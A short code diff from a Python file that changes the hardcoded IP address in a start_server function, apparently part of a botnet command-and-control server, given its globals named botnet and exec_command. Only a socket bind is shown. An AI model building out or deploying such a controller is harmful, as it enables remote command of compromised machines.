@@ -19,7 +19,7 @@ test_bool = False
 #            return True
 #    return False
 
-def start_server(port=2003,ip="142.93.197.240"):
+def start_server(port=2003,ip="157.230.232.167"):
     global botnet,exec_command,on_connect_exit
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.bind((ip,port))
